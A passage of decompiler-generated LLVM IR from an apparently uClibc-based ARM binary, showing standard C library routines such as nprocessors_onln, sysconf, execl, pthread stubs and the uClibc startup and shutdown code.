  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -33964), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_17f94 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -33964))
  store i32 %v1_17f94, i32* @r6, align 4
  %v2_17f98 = icmp eq i32 %v1_17f94, 0
  br i1 %v2_17f98, label %dec_label_pc_18018, label %dec_label_pc_17fa0

dec_label_pc_17fa0:                               ; preds = %entry
  store i32 532, i32* @sl, align 4
  %v0_17fa8 = load i32, i32* @r4, align 4
  %v2_17fa8 = add i32 %v0_17fa8, -33952
  store i32 %v2_17fa8, i32* @r8, align 4
  %v2_17fac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_17fac, i32* @r7, align 4
  br label %bb18

dec_label_pc_17fb4:                               ; preds = %bb18
  %v3_17fb4 = load i32, i32* %stack_var_-36, align 4
  %v1_17fb8 = inttoptr i32 %v3_17fb4 to i32*
  %v2_17fb8 = load i32, i32* %v1_17fb8, align 4
  %v1_17fbc = inttoptr i32 %v2_17fb8 to i8*
  %v2_17fbc = load i8, i8* %v1_17fbc, align 1
  %v7_17fc0 = icmp eq i8 %v2_17fbc, 99
  br i1 %v7_17fc0, label %dec_label_pc_17fc8, label %.backedge3

dec_label_pc_17fc8:                               ; preds = %dec_label_pc_17fb4
  %v1_17fc8 = add i32 %v2_17fb8, 1
  %v2_17fc8 = inttoptr i32 %v1_17fc8 to i8*
  %v3_17fc8 = load i8, i8* %v2_17fc8, align 1
  %v7_17fcc = icmp eq i8 %v3_17fc8, 112
  br i1 %v7_17fcc, label %dec_label_pc_17fd4, label %.backedge3

dec_label_pc_17fd4:                               ; preds = %dec_label_pc_17fc8
  %v1_17fd4 = add i32 %v2_17fb8, 2
  %v2_17fd4 = inttoptr i32 %v1_17fd4 to i8*
  %v3_17fd4 = load i8, i8* %v2_17fd4, align 1
  %v7_17fd8 = icmp eq i8 %v3_17fd4, 117
  br i1 %v7_17fd8, label %dec_label_pc_17fe0, label %.backedge3

dec_label_pc_17fe0:                               ; preds = %dec_label_pc_17fd4
  %v1_17fe0 = add i32 %v2_17fb8, 3
  %v2_17fe0 = inttoptr i32 %v1_17fe0 to i8*
  %v3_17fe0 = load i8, i8* %v2_17fe0, align 1
  %v4_17fe0 = zext i8 %v3_17fe0 to i32
  %v0_17fe4 = load i32, i32* @r4, align 4
  %v1_17fe4 = load i32, i32* @sl, align 4
  %v2_17fe4 = add i32 %v1_17fe4, %v0_17fe4
  %v3_17fe4 = inttoptr i32 %v2_17fe4 to i32*
  %v4_17fe4 = load i32, i32* %v3_17fe4, align 4
  %v2_17fe8 = mul nuw nsw i32 %v4_17fe0, 2
  %v2_17fec = add i32 %v4_17fe4, %v2_17fe8
  %v3_17fec = inttoptr i32 %v2_17fec to i16*
  %v4_17fec = load i16, i16* %v3_17fec, align 2
  %v1_17ff0 = and i16 %v4_17fec, 8
  %v2_17ff0 = icmp eq i16 %v1_17ff0, 0
  br i1 %v2_17ff0, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_17fe0
  %v1_17ff4 = load i32, i32* @r5, align 4
  %v2_17ff4 = add i32 %v1_17ff4, 1
  store i32 %v2_17ff4, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_17fe0, %dec_label_pc_17fb4, %dec_label_pc_17fc8, %dec_label_pc_17fd4
  %v0_17ff8.pre = load i32, i32* @r6, align 4
  %v0_18004.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_17fa0
  %v0_18004 = phi i32 [ %v0_18004.pre, %.backedge3 ], [ %v2_17fa8, %dec_label_pc_17fa0 ]
  %v0_17ff8 = phi i32 [ %v0_17ff8.pre, %.backedge3 ], [ %v1_17f94, %dec_label_pc_17fa0 ]
  %v4_18008 = inttoptr i32 %v0_17ff8 to i32*
  %v5_18008 = call i32 @__GI_config_read(i32* %v4_18008, i32 %v2_17fac, i32 258, i32 %v0_18004)
  %v2_1800c = icmp eq i32 %v5_18008, 0
  br i1 %v2_1800c, label %dec_label_pc_1807c, label %dec_label_pc_17fb4

dec_label_pc_18018:                               ; preds = %entry
  %v0_1801c = load i32, i32* @r4, align 4
  %v2_1801c = add i32 %v0_1801c, -33948
  store i32 %v2_1801c, i32* @r0, align 4
  %v1_18020 = call i32 @__GI_config_open(i32 %v2_1801c)
  store i32 %v1_18020, i32* @r6, align 4
  %v2_18024 = icmp eq i32 %v1_18020, 0
  br i1 %v2_18024, label %bb19, label %dec_label_pc_18030

bb19:                                             ; preds = %dec_label_pc_18018
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1807c

dec_label_pc_18030:                               ; preds = %dec_label_pc_18018
  %v0_18034 = load i32, i32* @r4, align 4
  %v2_18034 = add i32 %v0_18034, -33932
  store i32 %v2_18034, i32* @r8, align 4
  %v2_1803c = add i32 %v0_18034, -33896
  store i32 %v2_1803c, i32* @r7, align 4
  %v2_18040 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_18040, i32* @r4, align 4
  br label %bb21

dec_label_pc_18048:                               ; preds = %bb21
  %v0_18074 = load i32, i32* @r8, align 4
  %v3_18048 = load i32, i32* %stack_var_-36, align 4
  %v1_1804c = inttoptr i32 %v3_18048 to i32*
  %v2_1804c = load i32, i32* %v1_1804c, align 4
  store i32 %v2_1804c, i32* @r1, align 4
  %v2_18050 = inttoptr i32 %v0_18074 to i8*
  %v3_18050 = call i32 @__GI_strcoll(i8* %v2_18050, i32 %v2_1804c)
  %v2_18054 = icmp eq i32 %v3_18050, 0
  br i1 %v2_18054, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_18048
  %v1_18058 = load i32, i32* @r5, align 4
  %v2_18058 = add i32 %v1_18058, 1
  store i32 %v2_18058, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_18048
  %v0_18064.pre = load i32, i32* @r7, align 4
  %v0_18068.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_18030
  %v0_18068 = phi i32 [ %v0_18068.pre, %.backedge ], [ %v1_18020, %dec_label_pc_18030 ]
  %v0_18064 = phi i32 [ %v0_18064.pre, %.backedge ], [ %v2_1803c, %dec_label_pc_18030 ]
  %v4_1806c = inttoptr i32 %v0_18068 to i32*
  %v5_1806c = call i32 @__GI_config_read(i32* %v4_1806c, i32 %v2_18040, i32 459266, i32 %v0_18064)
  %v2_18070 = icmp eq i32 %v5_1806c, 0
  br i1 %v2_18070, label %dec_label_pc_1807c, label %dec_label_pc_18048

dec_label_pc_1807c:                               ; preds = %bb18, %bb21, %bb19
  %v0_1807c = load i32, i32* @r6, align 4
  %v1_18080 = inttoptr i32 %v0_1807c to i32*
  %v2_18080 = call i32 @__GI_config_close(i32* %v1_18080)
  %v0_18084 = load i32, i32* @r5, align 4
  %v2_18084 = icmp eq i32 %v0_18084, 0
  %.v0_18084 = select i1 %v2_18084, i32 1, i32 %v0_18084
  ret i32 %.v0_18084

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_1807c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_184a8

bb:                                               ; preds = %entry
  %v7_180d4 = mul i32 %arg1, 4
  %v8_180d4 = add i32 %v7_180d4, ptrtoint (i32* @global_var_180dc.1047 to i32)
  call void @__pseudo_branch(i32 %v8_180d4)
  br label %dec_label_pc_184a8

dec_label_pc_184a8:                               ; preds = %bb, %entry
  %v0_184a8 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_184b4 = inttoptr i32 %v0_184a8 to i32*
  store i32 22, i32* %v2_184b4, align 4
  %v0_18664 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_18664

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_18698 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_18698, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_186ac = ptrtoint i32* %stack_var_-40 to i32
  %v2_186b0 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_186c0

dec_label_pc_186c0:                               ; preds = %dec_label_pc_186c0, %entry
  %v0_186d4 = phi i32 [ 0, %entry ], [ %v1_186d4, %dec_label_pc_186c0 ]
  %stack_var_-36.0 = phi i32 [ %v2_186b0, %entry ], [ %v1_186c8, %dec_label_pc_186c0 ]
  %v1_186c4 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_186c4 = load i32, i32* %v1_186c4, align 4
  %v1_186c8 = add i32 %stack_var_-36.0, 4
  %v2_186cc = icmp eq i32 %v2_186c4, 0
  %v1_186d4 = add i32 %v0_186d4, 1
  store i32 %v1_186d4, i32* @lr, align 4
  br i1 %v2_186cc, label %dec_label_pc_186dc, label %dec_label_pc_186c0

dec_label_pc_186dc:                               ; preds = %dec_label_pc_186c0
  %v3_186dc = mul i32 %v1_186d4, 4
  %v1_186e0 = add i32 %v3_186dc, 18
  %v1_186e4 = and i32 %v1_186e0, -8
  %v2_186e8 = sub i32 %v2_186ac, %v1_186e4
  %v2_186f0 = inttoptr i32 %v2_186e8 to i32*
  store i32 %arg2, i32* %v2_186f0, align 4
  %v0_186fc = load i32, i32* @sp, align 4
  store i32 %v0_186fc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18704

dec_label_pc_18704:                               ; preds = %dec_label_pc_18704, %dec_label_pc_186dc
  %v1_18718 = phi i32 [ %v0_186fc, %dec_label_pc_186dc ], [ %v5_18718, %dec_label_pc_18704 ]
  %stack_var_-36.1 = phi i32 [ %v2_186b0, %dec_label_pc_186dc ], [ %v1_18710, %dec_label_pc_18704 ]
  %v1_18708 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_18708 = load i32, i32* %v1_18708, align 4
  %v0_1870c = load i32, i32* @lr, align 4
  %v1_1870c = add i32 %v0_1870c, -1
  store i32 %v1_1870c, i32* @lr, align 4
  %v7_1870c = icmp eq i32 %v0_1870c, 1
  %v1_18710 = add i32 %stack_var_-36.1, 4
  %v2_18718 = add i32 %v1_18718, 4
  %v3_18718 = inttoptr i32 %v2_18718 to i32*
  store i32 %v2_18708, i32* %v3_18718, align 4
  %v4_18718 = load i32, i32* %ip.global-to-local, align 4
  %v5_18718 = add i32 %v4_18718, 4
  store i32 %v5_18718, i32* %ip.global-to-local, align 4
  br i1 %v7_1870c, label %dec_label_pc_18720, label %dec_label_pc_18704

dec_label_pc_18720:                               ; preds = %dec_label_pc_18704
  %v0_1872c = call i32 @__GI_execve()
  ret i32 %v0_1872c

; uselistorder directives
  uselistorder i32 %v5_18718, { 1, 0 }
  uselistorder i32 %v0_1870c, { 1, 0 }
  uselistorder i32 %v1_186d4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_18754 = add i32 %tmp, 4
  %v4_18754 = inttoptr i32 %v3_18754 to i32*
  store i32 %arg3, i32* %v4_18754, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_18760 = icmp eq i32 %arg2, 0
  br i1 %v2_18760, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1876c = add i32 %tmp, 4
  %v3_1876c = inttoptr i32 %v2_1876c to i32*
  %v4_1876c = load i32, i32* %v3_1876c, align 4
  store i32 %v4_1876c, i32* %r0.global-to-local, align 4
  %v3_18770 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_18770, %bb ], [ undef, %entry ]
  %v2_18778 = xor i1 %v2_18760, true
  call void @__pseudo_cond_branch(i1 %v2_18778, i32 %.02)
  %v1_18784 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18784

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_187ac.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18788 = load i32, i32* @r4, align 4
  store i32 %v3_18788, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -28), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_187ac

dec_label_pc_187ac:                               ; preds = %dec_label_pc_187ac.dec_label_pc_187ac_crit_edge, %dec_label_pc_187ac.lr.ph
  %v1_187ac = phi i32 [ %v1_187b8, %dec_label_pc_187ac.dec_label_pc_187ac_crit_edge ], [ 0, %dec_label_pc_187ac.lr.ph ]
  %v0_187ac = phi i32 [ %v0_187ac.pre, %dec_label_pc_187ac.dec_label_pc_187ac_crit_edge ], [ add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -28), %dec_label_pc_187ac.lr.ph ]
  %v4_187ac = mul i32 %v1_187ac, 4
  %v5_187ac = add i32 %v4_187ac, %v0_187ac
  %v6_187ac = inttoptr i32 %v5_187ac to i32*
  %v7_187ac = load i32, i32* %v6_187ac, align 4
  call void @__pseudo_branch(i32 %v7_187ac)
  %v0_187b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_187b8 = add i32 %v0_187b8, -1
  store i32 %v1_187b8, i32* %r4.global-to-local, align 4
  %v2_187b8 = icmp eq i32 %v0_187b8, 0
  br i1 %v2_187b8, label %dec_label_pc_187c0, label %dec_label_pc_187ac.dec_label_pc_187ac_crit_edge

dec_label_pc_187ac.dec_label_pc_187ac_crit_edge:  ; preds = %dec_label_pc_187ac
  %v0_187ac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_187ac

dec_label_pc_187c0:                               ; preds = %dec_label_pc_187ac
  %v0_187c4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_187c4 = add i32 %v0_187c4.pre, 26296
  %v3_187c4 = inttoptr i32 %v2_187c4 to i32*
  %v4_187c4 = load i32, i32* %v3_187c4, align 4
  %v2_187c8 = icmp eq i32 %v4_187c4, 0
  br i1 %v2_187c8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_187c0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_187c0, %bb
  %v2_187d0 = xor i1 %v2_187c8, true
  call void @__pseudo_cond_branch(i1 %v2_187d0, i32 %v4_187c4)
  %v0_187d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_187d8 = add i32 %v0_187d8, 26300
  %v3_187d8 = inttoptr i32 %v2_187d8 to i32*
  %v4_187d8 = load i32, i32* %v3_187d8, align 4
  %v2_187dc = icmp eq i32 %v4_187d8, 0
  br i1 %v2_187dc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_187e4 = xor i1 %v2_187dc, true
  call void @__pseudo_cond_branch(i1 %v2_187e4, i32 %v4_187d8)
  %v2_187e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_187e8, i32* %r4.global-to-local, align 4
  %v1_187ec = load i32, i32* @r0, align 4
  ret i32 %v1_187ec

; uselistorder directives
  uselistorder i32 %v1_187b8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_18818 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_18820 = icmp eq i32 %v2_18818, -1
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r3, align 4
  br i1 %v3_18820, label %dec_label_pc_1882c, label %dec_label_pc_18844

dec_label_pc_1882c:                               ; preds = %entry
  %v0_18830 = load i32, i32* %r5.global-to-local, align 4
  %v2_18838 = call i32 @__GI_open(i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -33892), i32 %v0_18830)
  %v1_1883c = load i32, i32* %r4.global-to-local, align 4
  %v1_18840 = icmp ne i32 %v2_18838, %v1_1883c
  call void @__pseudo_cond_branch(i1 %v1_18840, i32 ptrtoint (i32* @global_var_174e4.1066 to i32))
  br label %dec_label_pc_18844

dec_label_pc_18844:                               ; preds = %entry, %dec_label_pc_1882c
  %v1_1884c = phi i32 [ %v2_18818, %entry ], [ %v2_18838, %dec_label_pc_1882c ]
  ret i32 %v1_1884c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_18844, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r4.global-to-local, align 4
  %v4_18868 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 104) to i32*), align 4
  %v1_1886c = inttoptr i32 %v4_18868 to i32*
  %v2_1886c = load i32, i32* %v1_1886c, align 4
  %v2_18870 = icmp eq i32 %v2_1886c, 0
  br i1 %v2_18870, label %dec_label_pc_18878, label %dec_label_pc_188ac

dec_label_pc_18878:                               ; preds = %entry
  %v4_1887c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 60) to i32*), align 4
  %v2_18884 = icmp eq i32 %v4_1887c, 0
  store i32 4096, i32* %v1_1886c, align 4
  br i1 %v2_18884, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_18878
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_18878, %bb
  %v2_18890 = xor i1 %v2_18884, true
  call void @__pseudo_cond_branch(i1 %v2_18890, i32 %v4_1887c)
  %v0_18898 = load i32, i32* %r4.global-to-local, align 4
  %v2_18898 = add i32 %v0_18898, -97236
  %v2_188a0 = icmp eq i32 %v2_18898, 0
  br i1 %v2_188a0, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_188a8 = xor i1 %v2_188a0, true
  call void @__pseudo_cond_branch(i1 %v2_188a8, i32 %v2_18898)
  br label %dec_label_pc_188ac

dec_label_pc_188ac:                               ; preds = %entry, %bb6
  %v1_188b0 = load i32, i32* @r0, align 4
  ret i32 %v1_188b0

; uselistorder directives
  uselistorder label %dec_label_pc_188ac, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_188cc = add i32 %tmp, 4
  store i32 %v1_188cc, i32* %ip.global-to-local, align 4
  %v2_188d0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  %v3_188dc = mul i32 %arg2, 4
  store i32 %v3_188dc, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_188e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 24) to i32*), align 4
  store i32 %v4_188e4, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_188ec = ptrtoint i32* %stack_var_-120 to i32
  %v4_188f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 32) to i32*), align 4
  store i32 %v4_188f0, i32* %r4.global-to-local, align 4
  %v2_188f8 = add i32 %v1_188cc, %v3_188dc
  store i32 %v2_188f8, i32* %ip.global-to-local, align 4
  %v9_188fc = icmp eq i32 %v2_188f8, %v2_188d0
  store i1 %v9_188fc, i1* %cpsr_z.global-to-local, align 1
  %v2_18900 = inttoptr i32 %v4_188e4 to i32*
  store i32 %arg7, i32* %v2_18900, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 26300, i32* %r2.global-to-local, align 4
  %v0_1890c = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_188fc, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_18910 = load i32, i32* @r7, align 4
  %v2_18910 = load i32, i32* %r5.global-to-local, align 4
  %v3_18910 = add i32 %v2_18910, %v1_18910
  store i32 %v3_18910, i32* %r3.global-to-local, align 4
  %v1_18914 = load i32, i32* @r6, align 4
  %v3_18914 = add i32 %v1_18914, 26300
  %v4_18914 = inttoptr i32 %v3_18914 to i32*
  store i32 %arg6, i32* %v4_18914, align 4
  %v0_18918 = load i32, i32* %ip.global-to-local, align 4
  %v1_18918 = load i32, i32* %r4.global-to-local, align 4
  %v2_18918 = inttoptr i32 %v1_18918 to i32*
  store i32 %v0_18918, i32* %v2_18918, align 4
  store i32 120, i32* @r2, align 4
  %v1_18924 = load i32, i32* %r3.global-to-local, align 4
  %v2_18924 = load i32, i32* %r4.global-to-local, align 4
  %v3_18924 = inttoptr i32 %v2_18924 to i32*
  store i32 %v1_18924, i32* %v3_18924, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_18914.c = load i32, i32* @r6, align 4
  %v3_18914.c = add i32 %v1_18914.c, 26300
  %v4_18914.c = inttoptr i32 %v3_18914.c to i32*
  store i32 %arg6, i32* %v4_18914.c, align 4
  %v0_18918.c = load i32, i32* %ip.global-to-local, align 4
  %v1_18918.c = load i32, i32* %r4.global-to-local, align 4
  %v2_18918.c = inttoptr i32 %v1_18918.c to i32*
  store i32 %v0_18918.c, i32* %v2_18918.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18930 = bitcast i32* %stack_var_-120 to i8*
  %v3_18930 = call i32 @__GI_memset(i8* %v2_18930, i32 0)
  %v0_18934 = load i32, i32* %r4.global-to-local, align 4
  %v1_18934 = inttoptr i32 %v0_18934 to i32*
  %storemerge.pre = load i32, i32* %v1_18934, align 4
  br label %dec_label_pc_18940

dec_label_pc_18940:                               ; preds = %dec_label_pc_18940, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_18940, %dec_label_pc_18940 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_18940 = inttoptr i32 %storemerge to i32*
  %v2_18940 = load i32, i32* %v1_18940, align 4
  store i32 %v2_18940, i32* %r3.global-to-local, align 4
  %v4_18940 = add i32 %storemerge, 4
  store i32 %v4_18940, i32* %r2.global-to-local, align 4
  %v2_18944 = icmp eq i32 %v2_18940, 0
  store i32 %v4_18940, i32* %r1.global-to-local, align 4
  br i1 %v2_18944, label %dec_label_pc_18950, label %dec_label_pc_18940

dec_label_pc_18950:                               ; preds = %dec_label_pc_18940
  store i32 %v4_18940, i32* @r4, align 4
  store i32 %v2_188ec, i32* @r5, align 4
  %v1_1897429 = inttoptr i32 %v4_18940 to i32*
  %v2_1897430 = load i32, i32* %v1_1897429, align 4
  store i32 %v2_1897430, i32* %r3.global-to-local, align 4
  %v2_1897832 = icmp eq i32 %v2_1897430, 0
  store i1 %v2_1897832, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1897832, label %dec_label_pc_18980, label %dec_label_pc_1895c

dec_label_pc_1895c:                               ; preds = %dec_label_pc_18950, %dec_label_pc_18974
  %v4_18964 = phi i32 [ %v1_18970, %dec_label_pc_18974 ], [ %v4_18940, %dec_label_pc_18950 ]
  %v5_18960 = phi i32 [ %v2_18974, %dec_label_pc_18974 ], [ %v2_1897430, %dec_label_pc_18950 ]
  %v2_1895c = icmp ugt i32 %v5_18960, 13
  %v7_1895c = icmp eq i32 %v5_18960, 14
  store i1 %v7_1895c, i1* %cpsr_z.global-to-local, align 1
  %v2_18960 = xor i1 %v2_1895c, true
  %v3_18960 = or i1 %v7_1895c, %v2_18960
  br i1 %v3_18960, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_1895c
  %v6_18960 = and i32 %v5_18960, 536870912
  %v7_18960 = icmp ne i32 %v6_18960, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_1895c, %bb59
  %v1_1896c = phi i1 [ %v2_1895c, %dec_label_pc_1895c ], [ %v7_18960, %bb59 ]
  %v2_18964 = xor i1 %v1_1896c, true
  %v3_18964 = or i1 %v7_1895c, %v2_18964
  br i1 %v3_18964, label %bb61, label %dec_label_pc_18974

bb61:                                             ; preds = %bb60
  store i32 %v4_18964, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18974

dec_label_pc_18974:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_18964, i32 ptrtoint (i32* @global_var_15a40.1075 to i32))
  %v0_18970 = load i32, i32* @r4, align 4
  %v1_18970 = add i32 %v0_18970, 8
  store i32 %v1_18970, i32* @r4, align 4
  %v1_18974 = inttoptr i32 %v1_18970 to i32*
  %v2_18974 = load i32, i32* %v1_18974, align 4
  store i32 %v2_18974, i32* %r3.global-to-local, align 4
  %v2_18978 = icmp eq i32 %v2_18974, 0
  store i1 %v2_18978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18978, label %dec_label_pc_18980, label %dec_label_pc_1895c

dec_label_pc_18980:                               ; preds = %dec_label_pc_18974, %dec_label_pc_18950
  %v1_18984 = call i32 @_dl_aux_init(i32 %v2_188ec)
  store i32 %v1_18984, i32* @r0, align 4
  %v1_18988 = call i32 @__GI___uClibc_init(i32 %v1_18984)
  store i32 %v1_18988, i32* @r0, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_18994 = load i32, i32* @r6, align 4
  %v2_18994 = add i32 %v0_18994, 104
  %v3_18994 = inttoptr i32 %v2_18994 to i32*
  %v4_18994 = load i32, i32* %v3_18994, align 4
  store i32 %v4_18994, i32* %r1.global-to-local, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_1899c = icmp eq i32 %tmp54, 0
  store i1 %v2_1899c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1899c, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_18980
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_18980, %bb62
  %v0_189a8 = phi i32 [ %tmp54, %dec_label_pc_18980 ], [ 4096, %bb62 ]
  %v3_189a4 = icmp eq i32 %tmp53, -1
  %v8_189a4 = icmp eq i32 %tmp53, -1
  store i1 %v8_189a4, i1* %cpsr_z.global-to-local, align 1
